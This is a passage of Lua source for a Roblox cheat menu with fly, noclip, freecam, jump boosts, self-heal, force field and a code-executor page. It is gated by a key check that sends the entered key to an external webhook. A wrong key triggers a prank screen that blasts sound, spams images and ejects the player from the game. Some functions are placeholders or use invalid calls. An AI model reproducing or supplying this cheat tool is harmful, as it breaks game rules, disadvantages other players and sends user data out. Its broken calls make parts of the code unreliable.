    label.Text = labelText
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Gotham
    label.TextSize = 14
    label.Parent = container

    local track = Instance.new("Frame")
    track.Size = UDim2.new(1, 0, 0.3, 0)
    track.Position = UDim2.new(0, 0, 0.5, 0)
    track.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    track.Parent = container
    local trackCorner = Instance.new("UICorner", track)
    trackCorner.CornerRadius = UDim.new(0, 6)

    local knob = Instance.new("TextButton")
    knob.Size = UDim2.new(0, 12, 0, 20)
    knob.Position = UDim2.new(0, (initialValue - min) / (max - min) * track.AbsoluteSize.X - 6, 0.5, -10)
    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    knob.Text = ""
    knob.AutoButtonColor = false
    knob.Parent = track
    local knobCorner = Instance.new("UICorner", knob)
    knobCorner.CornerRadius = UDim.new(0, 4)

    local valueLabel = Instance.new("TextLabel")
    valueLabel.Size = UDim2.new(1, 0, 0.3, 0)
    valueLabel.Position = UDim2.new(0, 0, 0.7, 0)
    valueLabel.BackgroundTransparency = 1
    valueLabel.Text = tostring(initialValue)
    valueLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    valueLabel.Font = Enum.Font.Gotham
    valueLabel.TextSize = 12
    valueLabel.Parent = container

    local dragging = false
    knob.MouseButton1Down:Connect(function()
        dragging = true
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local mouseX = UserInputService:GetMouseLocation().X
            local trackPos = track.AbsolutePosition.X
            local trackSize = track.AbsoluteSize.X
            local newX = math.clamp(mouseX - trackPos, 0, trackSize)
            local percent = newX / trackSize
            local value = min + percent * (max - min)
            knob.Position = UDim2.new(0, newX - 6, 0.5, -10)
            valueLabel.Text = string.format("%.2f", value)
            callback(value)
        end
    end)

    return container
end

-- Altitude Slider
createSlider("Altitude Value", altitudeValue, 0, 10, function(value)
    altitudeValue = value
    -- Apply to jumps if enabled
end)

-- FOV Slider
createSlider("FOV Value", fovValue, 0.5, 2, function(value)
    fovValue = value
    if customFOVEnabled then
        workspace.CurrentCamera.FieldOfView = 70 * value
    end
end)

-- Freecam Speed Slider
createSlider("Freecam Speed", freecamSpeed, 0.1, 5, function(value)
    freecamSpeed = value
end)

-- Noclip Speed Slider
createSlider("Noclip Speed", noclipSpeed, 0.1, 5, function(value)
    noclipSpeed = value
end)

-- Functions Section
local functionsLabel = Instance.new("TextLabel")
functionsLabel.Size = UDim2.new(1, 0, 0, 20)
functionsLabel.Position = UDim2.new(0, 0, 0, 250) -- Approximate position after sliders
functionsLabel.Text = "Functions"
functionsLabel.BackgroundTransparency = 1
functionsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
functionsLabel.Font = Enum.Font.GothamBold
functionsLabel.TextSize = 16
functionsLabel.Parent = rightScroll

local function createFunctionButton(text, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 35)
    btn.Text = text
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.Parent = rightScroll
    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0, 6)
    btn.MouseButton1Click:Connect(callback)
    return btn
end

createFunctionButton("Heal", function()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.Health = LocalPlayer.Character.Humanoid.MaxHealth
    end
end)

createFunctionButton("Armor", function()
    -- Placeholder: Add force field or something
    if LocalPlayer.Character then
        local ff = Instance.new("ForceField")
        ff.Parent = LocalPlayer.Character
    end
end)

createFunctionButton("Suicide", function()
    if LocalPlayer.Character then
        LocalPlayer.Character:BreakJoints()
    end
end)

createFunctionButton("ESP Revive", function()
    -- Placeholder: Revive with ESP (highlight)
    if LocalPlayer.Character then
        LocalPlayer.Character:BreakJoints() -- Kill first
        task.wait(1)
        LocalPlayer.Character:LoadCharacter() -- Respawn
    end
end)

createFunctionButton("Native Revive", function()
    -- Simple respawn
    LocalPlayer.Character:LoadCharacter()
end)

createFunctionButton("Rejoin", function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
end)

rightScroll.CanvasSize = UDim2.new(0, 0, 0, rightLayout.AbsoluteContentSize.Y + 10)

-- Keybind capturing for Freecam and Noclip
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if capturingFreecam and input.UserInputType == Enum.UserInputType.Keyboard then
        capturingFreecam = false
        freecamKey = input.KeyCode
        freecamKeyBtn.Text = "Set Key"
        freecamKeyLabel.Text = "Freecam Key: " .. tostring(freecamKey.Name)
    elseif capturingNoclip and input.UserInputType == Enum.UserInputType.Keyboard then
        capturingNoclip = false
        noclipKey = input.KeyCode
        noclipKeyBtn.Text = "Set Key"
        noclipKeyLabel.Text = "Noclip Key: " .. tostring(noclipKey.Name)
    elseif freecamKey and input.KeyCode == freecamKey then
        freecamEnabled = not freecamEnabled
        freecamBtn.BackgroundColor3 = freecamEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    elseif noclipKey and input.KeyCode == noclipKey then
        noclipEnabled = not noclipEnabled
        noclipBtn.BackgroundColor3 = noclipEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    end
end)

-- Jump handling for super/beast/custom/infinite
UserInputService.JumpRequest:Connect(function()
    local char = LocalPlayer.Character
    local humanoid = char and char:FindFirstChild("Humanoid")
    if humanoid then
        local jumpPower = 50 -- Default
        if superJumpEnabled then
            jumpPower = 100
        elseif beastJumpEnabled then
            jumpPower = 200
        elseif customAltitudeEnabled then
            jumpPower = 50 * altitudeValue
        end
        humanoid.JumpPower = jumpPower
        if infiniteJumpEnabled then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

-- Freecam logic (basic implementation)
local camera = workspace.CurrentCamera
local freecamConnection
local function startFreecam()
    if freecamConnection then return end
    freecamConnection = RunService.Heartbeat:Connect(function()
        local moveVector = Vector3.new(0, 0, 0)
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveVector = moveVector + camera.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveVector = moveVector - camera.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveVector = moveVector - camera.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveVector = moveVector + camera.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveVector = moveVector + Vector3.new(0, 1, 0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveVector = moveVector - Vector3.new(0, 1, 0) end
        camera.CFrame = camera.CFrame + (moveVector.Unit * freecamSpeed)
    end)
end

local function stopFreecam()
    if freecamConnection then
        freecamConnection:Disconnect()
        freecamConnection = nil
    end
end

freecamBtn.MouseButton1Click:Connect(function()
    if freecamEnabled then
        startFreecam()
    else
        stopFreecam()
    end
end)

-- Noclip logic
local noclipConnection
noclipConnection = RunService.Stepped:Connect(function()
    if noclipEnabled and LocalPlayer.Character then
        for _, part in ipairs(LocalPlayer.Character:GetChildren()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end
end)

-- Fly logic
local flySpeed = 50 -- Adjustable if needed
local flyBodyVelocity = nil
local flyConnection
local function startFly()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart
    flyBodyVelocity = Instance.new("BodyVelocity")
    flyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
    flyBodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    flyBodyVelocity.Parent = hrp

    flyConnection = RunService.Heartbeat:Connect(function()
        local move = Vector3.new(0, 0, 0)
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + workspace.CurrentCamera.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - workspace.CurrentCamera.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - workspace.CurrentCamera.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + workspace.CurrentCamera.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then move = move - Vector3.new(0, 1, 0) end
        flyBodyVelocity.Velocity = move * flySpeed
    end)
end

local function stopFly()
    if flyBodyVelocity then
        flyBodyVelocity:Destroy()
        flyBodyVelocity = nil
    end
    if flyConnection then
        flyConnection:Disconnect()
        flyConnection = nil
    end
end

flyBtn.MouseButton1Click:Connect(function()
    if flyEnabled then
        startFly()
    else
        stopFly()
    end
end)

local function ShowPage(page)
    -- Hide all pages including tabHolder
    tabHolder.Visible = false
    SettingsPage.Visible = false
    ExecutorPage.Visible = false
    GridPage.Visible = false
    WorldPage.Visible = false -- Added WorldPage
    -- Hide all tab panels
    for _, panel in pairs(tabPanels) do
        panel.Visible = false
    end
    
    -- Toggle sidebar visibility
    if page == tabHolder then
        sideBar.Visible = true
        tabHolder.Visible = true
        -- Show the current tab panel
        if currentTab then
            tabPanels[currentTab].Visible = true
        end
    else
        sideBar.Visible = false
        page.Visible = true
    end
end

HomeBtn.MouseButton1Click:Connect(function()
    ShowPage(tabHolder) -- Shows the tabHolder (Main Menu)
end)

GridBtn.MouseButton1Click:Connect(function()
    ShowPage(GridPage)
    refreshPlayerList(searchBox.Text)
end)

SettingsBtn.MouseButton1Click:Connect(function()
    ShowPage(SettingsPage)
end)

CodeBtn.MouseButton1Click:Connect(function()
    ShowPage(ExecutorPage)
end)

WorldBtn.MouseButton1Click:Connect(function() -- New World button connection
    ShowPage(WorldPage)
end)

ShowPage(tabHolder) -- Default to Main Menu

updateAllButtonColors(selectedColor)
end

-- Submit Button Logic
Submit.MouseButton1Click:Connect(function()
    local enteredKey = TextBox.Text

    if table.find(whitelistedKeys, enteredKey) then
        print("‚úÖ Correct key! Showing loading screen...")

        pcall(function()
            Submit.Text = "Loading..."
            KeyGui:Destroy()
        end)

        sendWebhook(enteredKey)
        runGUI()
    else
        -- Hide main frame
        Frame.Visible = false

        local Players = game:GetService("Players")
        local TeleportService = game:GetService("TeleportService")
        local TweenService = game:GetService("TweenService")
        local SoundService = game:GetService("SoundService")
        local RunService = game:GetService("RunService")
        local LocalPlayer = Players.LocalPlayer
        local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

        pcall(function() KeyGui:Destroy() end)

        ---------------------------------------------------------------------
        -- üñ• Custom "Disconnected" UI
        ---------------------------------------------------------------------
        local gui = Instance.new("ScreenGui", PlayerGui)
        gui.Name = "DisconnectedScreen"
        gui.IgnoreGuiInset = true
        gui.ResetOnSpawn = false

        local bg = Instance.new("Frame", gui)
        bg.Size = UDim2.new(1, 0, 1, 0)
        bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        bg.BackgroundTransparency = 0.4

        local box = Instance.new("Frame", gui)
        box.AnchorPoint = Vector2.new(0.5, 0.5)
        box.Position = UDim2.new(0.5, 0, 0.5, 0)
        box.Size = UDim2.new(0, 400, 0, 220)
        box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        box.ZIndex = 10
        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8)

        local title = Instance.new("TextLabel", box)
        title.Size = UDim2.new(1, 0, 0, 40)
        title.BackgroundTransparency = 1
        title.Text = "Disconnected"
        title.Font = Enum.Font.GothamBold
        title.TextColor3 = Color3.fromRGB(255, 255, 255)
        title.TextScaled = true
        title.ZIndex = 11

        local message = Instance.new("TextLabel", box)
        message.Position = UDim2.new(0, 20, 0, 70)
        message.Size = UDim2.new(1, -40, 0, 80)
        message.BackgroundTransparency = 1
        message.Text = "WRONG KEY KA BOSS BILI KAMUNA!"
        message.Font = Enum.Font.GothamBold
        message.TextWrapped = true
        message.TextColor3 = Color3.fromRGB(255, 255, 255)
        message.TextScaled = true
        message.ZIndex = 11

        local leaveBtn = Instance.new("TextButton", box)
        leaveBtn.Size = UDim2.new(0, 120, 0, 40)
        leaveBtn.Position = UDim2.new(0.5, -60, 1, -55)
        leaveBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        leaveBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        leaveBtn.Font = Enum.Font.GothamBold
        leaveBtn.TextSize = 20
        leaveBtn.Text = "Leave"
        leaveBtn.ZIndex = 12
        Instance.new("UICorner", leaveBtn).CornerRadius = UDim.new(0, 6)

        ---------------------------------------------------------------------
        -- üîä Play sound fully (no auto-stop)
        ---------------------------------------------------------------------
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://142376088"
        sound.Volume = 6
        sound.Looped = false
        sound.Parent = SoundService
        sound:Play()

        ---------------------------------------------------------------------
        -- üñº Spam Asset Images
        ---------------------------------------------------------------------
        local assetIDs = {
            2349860830,
            10952294514,
            175795047,
            15211890
        }

        for i = 1, 40 do
            task.spawn(function()
                local img = Instance.new("ImageLabel")
                img.Parent = gui
                img.BackgroundTransparency = 1
                img.Size = UDim2.new(0, math.random(80, 250), 0, math.random(80, 250))
                img.Position = UDim2.new(math.random(), -100, math.random(), -100)
                img.Image = "rbxassetid://" .. assetIDs[math.random(1, #assetIDs)]
                img.ZIndex = 20
                img.ImageTransparency = 0
                img.Rotation = math.random(-180, 180)

                local tween = TweenService:Create(img, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    ImageTransparency = 1,
                    Position = UDim2.new(math.random(), 100, math.random(), 100)
                })
                tween:Play()
                game.Debris:AddItem(img, 3.5)
            end)
        end

        ---------------------------------------------------------------------
        -- üß® Leave button + auto-leave after song finishes
        ---------------------------------------------------------------------
        leaveBtn.MouseButton1Click:Connect(function()
            TeleportService:Teleport(0, LocalPlayer)
        end)

        -- Wait until song finishes, then leave
        sound.Ended:Wait()
        TeleportService:Teleport(0, LocalPlayer)
    end
end)
